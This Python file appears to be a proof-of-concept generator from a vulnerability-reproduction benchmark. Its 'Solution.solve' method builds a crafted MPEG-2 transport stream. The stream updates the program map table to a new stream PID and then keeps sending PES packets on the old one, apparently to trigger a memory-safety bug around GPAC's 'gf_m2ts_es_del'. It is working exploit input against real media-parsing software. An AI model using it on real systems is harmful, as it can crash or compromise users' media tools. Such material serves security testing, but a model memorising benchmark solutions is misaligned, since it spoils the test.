import tarfile
from typing import Optional


def _crc32_mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _u16be(x: int) -> bytes:
    return bytes([(x >> 8) & 0xFF, x & 0xFF])


def _u32be(x: int) -> bytes:
    return bytes([(x >> 24) & 0xFF, (x >> 16) & 0xFF, (x >> 8) & 0xFF, x & 0xFF])


def _ts_packet(pid: int, pusi: int, cc: int, payload: bytes) -> bytes:
    if len(payload) != 184:
        if len(payload) > 184:
            payload = payload[:184]
        else:
            payload = payload + (b"\xFF" * (184 - len(payload)))
    b0 = 0x47
    b1 = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
    b2 = pid & 0xFF
    b3 = 0x10 | (cc & 0x0F)  # payload only
    return bytes([b0, b1, b2, b3]) + payload


def _pat_section(pmt_pid: int, tsid: int = 1, version: int = 0, program_number: int = 1) -> bytes:
    section_length = 13
    sec = bytearray()
    sec.append(0x00)  # table_id
    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
    sec.append(section_length & 0xFF)
    sec += _u16be(tsid)
    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # reserved, version, current_next
    sec.append(0x00)  # section_number
    sec.append(0x00)  # last_section_number
    sec += _u16be(program_number)
    sec.append(0xE0 | ((pmt_pid >> 8) & 0x1F))
    sec.append(pmt_pid & 0xFF)
    crc = _crc32_mpeg2(bytes(sec))
    sec += _u32be(crc)
    return bytes(sec)


def _pmt_section(
    program_number: int,
    version: int,
    pcr_pid: int,
    es_pid: int,
    stream_type: int = 0x1B,
) -> bytes:
    program_info_length = 0
    es_info_length = 0
    section_length = 18  # fixed for one ES, no descriptors
    sec = bytearray()
    sec.append(0x02)  # table_id
    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
    sec.append(section_length & 0xFF)
    sec += _u16be(program_number)
    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    sec.append(0x00)  # section_number
    sec.append(0x00)  # last_section_number
    sec.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
    sec.append(pcr_pid & 0xFF)
    sec.append(0xF0 | ((program_info_length >> 8) & 0x0F))
    sec.append(program_info_length & 0xFF)
    sec.append(stream_type & 0xFF)
    sec.append(0xE0 | ((es_pid >> 8) & 0x1F))
    sec.append(es_pid & 0xFF)
    sec.append(0xF0 | ((es_info_length >> 8) & 0x0F))
    sec.append(es_info_length & 0xFF)
    crc = _crc32_mpeg2(bytes(sec))
    sec += _u32be(crc)
    return bytes(sec)


def _psi_payload(section: bytes) -> bytes:
    return b"\x00" + section  # pointer_field=0


def _pes_start_payload(stream_id: int = 0xE0, fill: int = 0x55) -> bytes:
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes.append(stream_id & 0xFF)
    pes += b"\x00\x00"  # PES_packet_length=0 (unbounded)
    pes += b"\x80\x00\x00"  # MPEG2 PES: '10', no flags, header_data_length=0
    if len(pes) < 184:
        pes += bytes([fill]) * (184 - len(pes))
    return bytes(pes[:184])


def _pes_cont_payload(fill: int = 0x56) -> bytes:
    # Avoid 00 00 01 at the start to reduce chance of resync heuristics
    return bytes([fill]) * 184


def _detect_has_symbol(src_path: str, sym: str) -> bool:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hh")):
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                if sym.encode("utf-8") in data:
                    return True
    except Exception:
        return False
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = _detect_has_symbol(src_path, "gf_m2ts_es_del")

        pmt_pid = 0x0100
        old_es_pid = 0x0101
        new_es_pid = 0x0102

        pat = _ts_packet(0x0000, 1, 0, _psi_payload(_pat_section(pmt_pid)))
        pmt_v0 = _ts_packet(pmt_pid, 1, 0, _psi_payload(_pmt_section(1, 0, old_es_pid, old_es_pid, 0x1B)))

        pes_start = _ts_packet(old_es_pid, 1, 0, _pes_start_payload(0xE0, 0x55))

        pmt_v1 = _ts_packet(pmt_pid, 1, 1, _psi_payload(_pmt_section(1, 1, new_es_pid, new_es_pid, 0x1B)))

        pes_cont1 = _ts_packet(old_es_pid, 0, 1, _pes_cont_payload(0x56))
        pes_cont2 = _ts_packet(old_es_pid, 0, 2, _pes_cont_payload(0x57))

        return pat + pmt_v0 + pes_start + pmt_v1 + pes_cont1 + pes_cont2